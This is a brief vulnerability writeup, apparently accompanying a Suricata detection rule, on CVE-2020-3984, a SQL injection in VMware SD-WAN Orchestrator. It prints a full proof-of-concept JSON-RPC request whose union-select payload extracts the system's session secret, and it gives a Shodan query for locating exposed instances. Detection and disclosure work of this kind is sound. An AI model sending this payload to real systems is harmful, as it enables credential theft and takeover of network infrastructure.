## Overview
CVE-2020-3984 is a Union-based SQL injection on VMware SD-WAN Orchestrator (former VeloCloud).

Although it requires valid credentials, attackers could chain it with CVE-2020-4001 to exploit without authenticating.

The Suricata rule tries to capture the method "**softwareUpdate/getSoftwareUpdates**" and the "**union select**" keyword (fundamentally in Union-based SQL injection).

### Bonus for bug bounty hunters
Search for VMware SD-WAN Orchestrator on Shodan:
**http.title:"VeloCloud"**

## Proof of Concept
```
POST /portal/ HTTP/1.1
Host: example.com
Content-Length: 413
Content-Type: application/json

{"jsonrpc": "2.0", "method": "softwareUpdate/getSoftwareUpdates", "params": {"with": ["profileCount"], "modulo": 5, "modulus": "9999 UNION SELECT a.id, a.networkId, a.name, b.value, a.version, a.buildNumber, a.deviceFamily, a.updateType, a.deviceCategory, a.buildType, a.manifest, a.blobId from VELOCLOUD_SOFTWARE_UPDATE a, VELOCLOUD_SYSTEM_PROPERTY b where a.id = 1 and b.name=\"session.secret\"; -- "}, "id": 5}
```

## References
* https://medium.com/realmodelabs/sd-pwn-part-4-vmware-velocloud-the-last-takeover-a7016f9a9175
* https://github.com/RealmodeLabs/SD-PWN/blob/master/vmware_velocloud_orchestrator_rce.py
* https://www.vmware.com/security/advisories/VMSA-2020-0025.html